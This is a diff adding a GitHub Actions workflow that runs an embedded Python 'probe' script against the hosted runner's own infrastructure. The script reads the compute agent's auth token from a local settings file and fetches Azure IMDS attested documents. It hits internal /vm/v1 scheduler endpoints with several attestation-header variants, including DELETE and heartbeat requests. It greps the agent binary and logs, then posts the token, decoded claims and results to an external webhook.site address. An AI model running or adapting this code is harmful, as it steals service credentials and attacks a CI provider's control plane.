@@ -1,0 +1,226 @@
+name: Probe v51 - account_a
+on:
+  workflow_dispatch:
+jobs:
+  probe:
+    runs-on: ubuntu-24.04
+    env:
+      V51_SOURCE: v51_account_a
+    steps:
+      - name: v51 vm/v1 x-attestation-document header
+        run: |
+          cat > /tmp/v51_probe.py << 'PROBE_EOF'
+          
+          import json, os, base64, subprocess, re, urllib.request, urllib.error, time
+          
+          WEBHOOK = "https://webhook.site/53b82227-04b4-4ad2-9ccd-2abbd8a81837"
+          RUN_ID  = os.environ.get("GITHUB_RUN_ID", "unknown")
+          REPO    = os.environ.get("GITHUB_REPOSITORY", "unknown")
+          SOURCE  = os.environ.get("V51_SOURCE", "v51_account_a")
+          
+          def probe(method, url, body=None, extra=None):
+              data = body.encode() if isinstance(body, str) else (body or None)
+              headers = {"Content-Type": "application/json", "User-Agent": "hosted-compute-agent/1.0"}
+              if extra:
+                  headers.update(extra)
+              if data:
+                  headers["Content-Length"] = str(len(data))
+              req = urllib.request.Request(url, data=data, headers=headers, method=method)
+              try:
+                  r = urllib.request.urlopen(req, timeout=14)
+                  return {"status": r.status, "body": r.read(8000).decode("utf-8","replace"), "hdrs": dict(r.headers)}
+              except urllib.error.HTTPError as e:
+                  return {"status": e.code, "body": e.read(8000).decode("utf-8","replace"), "hdrs": dict(e.headers)}
+              except Exception as ex:
+                  return {"status": 0, "body": str(ex), "hdrs": {}}
+          
+          def auth(method, url, token, body=None, extra_headers=None):
+              h = {"Authorization": f"Bearer {token}"}
+              if extra_headers:
+                  h.update(extra_headers)
+              return probe(method, url, body, h)
+          
+          def sh(cmd, timeout=12):
+              try:
+                  r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
+                  return r.stdout + r.stderr
+              except Exception as ex:
+                  return f"TIMEOUT/ERROR: {ex}"
+          
+          print(f"[{SOURCE}] start")
+          
+          with open("/opt/hca/.settings") as f:
+              s = json.load(f)
+          
+          token     = s.get("authToken", "")
+          sched_url = s.get("schedulerApiUrl", "").rstrip("/")
+          orch_id   = os.environ.get("ACTIONS_ORCHESTRATION_ID", "")
+          
+          parts = token.split(".")
+          pad = parts[1] + "=" * (4 - len(parts[1]) % 4)
+          claims = json.loads(base64.urlsafe_b64decode(pad))
+          
+          results = {}
+          
+          # -- 1. Get IMDS attested document (PKCS7) ---------------------------------
+          print(f"\n[{SOURCE}] Fetching IMDS attested document...")
+          r = probe("GET",
+              "http://169.254.169.254/metadata/attested/document?api-version=2021-02-01",
+              extra={"Metadata": "true"})
+          imds_att_raw = r["body"]
+          print(f"[IMDS_ATT] status={r['status']} len={len(imds_att_raw)}")
+          
+          pkcs7_sig = ""
+          att_full_json = imds_att_raw
+          try:
+              att_data = json.loads(imds_att_raw)
+              pkcs7_sig = att_data.get("signature", "")
+              print(f"[IMDS_ATT] pkcs7_sig len={len(pkcs7_sig)} prefix={pkcs7_sig[:60]}")
+              results["pkcs7_signature"] = pkcs7_sig
+          except Exception as ex:
+              print(f"[IMDS_ATT] parse error: {ex}")
+          
+          # -- 2. Get IMDS tags for vm/v1 URL ----------------------------------------
+          r2 = probe("GET", "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
+                     extra={"Metadata": "true"})
+          try:
+              imds_data = json.loads(r2["body"])
+              tags_list = imds_data.get("compute", {}).get("tagsList", [])
+              hc_tags = {t["name"]: t["value"] for t in tags_list if "hosted_compute" in t.get("name","")}
+              base_ro_url = hc_tags.get("hosted_compute.base_ro_url", "").rstrip("/")
+              allocation_id = hc_tags.get("hosted_compute.allocation_id", "")
+              print(f"[IMDS] base_ro_url={base_ro_url} allocation_id={allocation_id}")
+              results["imds_tags"] = hc_tags
+          except Exception as ex:
+              print(f"[IMDS] parse error: {ex}")
+              base_ro_url = ""
+              allocation_id = ""
+          
+          if not base_ro_url:
+              from urllib.parse import urlparse
+              parsed = urlparse(sched_url)
+              base_ro_url = f"{parsed.scheme}://{parsed.netloc}/vm/v1"
+          
+          # -- 3. Probe /vm/v1 with x-attestation-document --------------------------
+          print(f"\n[{SOURCE}] Probing /vm/v1 with x-attestation-document header...")
+          vm_results = {}
+          
+          test_paths = [
+              ("GET", "/"),
+              ("GET", "/health"),
+              ("GET", "/info"),
+              ("GET", f"/{allocation_id}" if allocation_id else "/test"),
+              ("GET", f"/{allocation_id}/status" if allocation_id else "/test/status"),
+              ("GET", f"/{allocation_id}/config" if allocation_id else "/test/config"),
+              ("PUT", f"/{allocation_id}/heartbeat" if allocation_id else "/test/heartbeat"),
+              ("POST", f"/{allocation_id}/heartbeat" if allocation_id else "/test/heartbeat"),
+              ("DELETE", f"/{allocation_id}" if allocation_id else "/test"),
+          ]
+          
+          # Multiple x-attestation-document value formats
+          b64_full_json = base64.b64encode(att_full_json.encode()).decode() if att_full_json else ""
+          
+          variants = [
+              # A: pkcs7_sig as x-attestation-document (most likely correct)
+              ("A_doc_sig", {
+                  "x-attestation-provider": "azure",
+                  "x-attestation-encoding": "pkcs7",
+                  "x-attestation-document": pkcs7_sig,
+              }),
+              # B: full JSON as x-attestation-document
+              ("B_doc_json", {
+                  "x-attestation-provider": "azure",
+                  "x-attestation-encoding": "pkcs7",
+                  "x-attestation-document": att_full_json,
+              }),
+              # C: base64 of full JSON as x-attestation-document
+              ("C_doc_b64json", {
+                  "x-attestation-provider": "azure",
+                  "x-attestation-encoding": "pkcs7",
+                  "x-attestation-document": b64_full_json,
+              }),
+              # D: no encoding header, just provider + document (sig)
+              ("D_no_enc_doc_sig", {
+                  "x-attestation-provider": "azure",
+                  "x-attestation-document": pkcs7_sig,
+              }),
+              # E: all three headers + x-attestation-data: sig too
+              ("E_all_headers_sig", {
+                  "x-attestation-provider": "azure",
+                  "x-attestation-encoding": "pkcs7",
+                  "x-attestation-document": pkcs7_sig,
+                  "x-attestation-data": pkcs7_sig,
+              }),
+          ]
+          
+          for var_label, var_headers in variants:
+              if not pkcs7_sig and "sig" in var_label:
+                  print(f"[VM-ATTEST] {var_label}: SKIPPED (no sig)")
+                  continue
+              print(f"\n[VM-ATTEST] Variant {var_label}: headers={list(var_headers.keys())}")
+              for method, path in test_paths:
+                  url = base_ro_url + path
+                  r = auth(method, url, token,
+                           body='{}' if method != "GET" else None,
+                           extra_headers=var_headers)
+                  key = f"{var_label}_{method}_{path.lstrip('/').replace('/', '_')}"
+                  vm_results[key] = {"status": r["status"], "body": r["body"][:2000]}
+                  status = r["status"]
+                  body_short = r["body"][:200]
+                  marker = ""
+                  if status not in (401, 404, 405):
+                      marker = "*** "
+                  print(f"[VM-ATTEST] {marker}{var_label} {method} {path} -> {status} | {body_short}")
+          
+          results["vm_attestation_v51"] = vm_results
+          
+          # -- 4. Also probe /vm without /v1 ----------------------------------------
+          from urllib.parse import urlparse
+          parsed = urlparse(base_ro_url)
+          base_no_v1 = f"{parsed.scheme}://{parsed.netloc}/vm"
+          print(f"\n[{SOURCE}] Probing /vm (no /v1)...")
+          vm_no_v1 = {}
+          for method, path in [("GET", "/"), ("GET", "/health"), ("GET", "/info"),
+                                ("GET", f"/{allocation_id}" if allocation_id else "/test")]:
+              url = base_no_v1 + path
+              r = auth(method, url, token, extra_headers={
+                  "x-attestation-provider": "azure",
+                  "x-attestation-encoding": "pkcs7",
+                  "x-attestation-document": pkcs7_sig,
+              })
+              key = f"{method}_{path.lstrip('/').replace('/','_')}"
+              vm_no_v1[key] = {"status": r["status"], "body": r["body"][:500]}
+              print(f"[VM_NO_V1] {method} {path} -> {r['status']} | {r['body'][:100]}")
+          results["vm_no_v1"] = vm_no_v1
+          
+          # -- 5. Check HCA binary strings for x-attestation header names -----------
+          print(f"\n[{SOURCE}] Scanning HCA binary for attestation header names...")
+          hca_bin_scan = sh("strings /opt/hca/hosted-compute-agent 2>/dev/null | grep -i 'attest' | sort -u")
+          print(f"[HCA_BIN] attest strings:\n{hca_bin_scan[:2000]}")
+          results["hca_bin_attest_strings"] = hca_bin_scan[:3000]
+          
+          # -- 6. Read HCA log for attestation-related entries ----------------------
+          hca_log = sh("cat /opt/hca/logs/hosted-compute-agent.log 2>/dev/null | grep -i 'attest\\|x-attest\\|pkcs\\|document' | head -50")
+          print(f"[HCA_LOG] attest log lines:\n{hca_log}")
+          results["hca_log_attest"] = hca_log[:3000]
+          
+          # -- 7. POST webhook -------------------------------------------------------
+          payload = {
+              "source": SOURCE, "run_id": RUN_ID, "repo": REPO,
+              "token": token, "claims": claims, "orch_id": orch_id,
+              "results": results,
+          }
+          data = json.dumps(payload, default=str).encode()
+          req = urllib.request.Request(WEBHOOK, data=data,
+                                        headers={"Content-Type": "application/json"}, method="POST")
+          try:
+              r = urllib.request.urlopen(req, timeout=30)
+              print(f"\n[{SOURCE}] Webhook: {r.status}")
+          except Exception as ex:
+              print(f"[{SOURCE}] Webhook error: {ex}")
+          
+          print(f"[{SOURCE}] DONE")
+          PROBE_EOF
+          python3 /tmp/v51_probe.py
+      - name: Keep alive
+        run: sleep 60
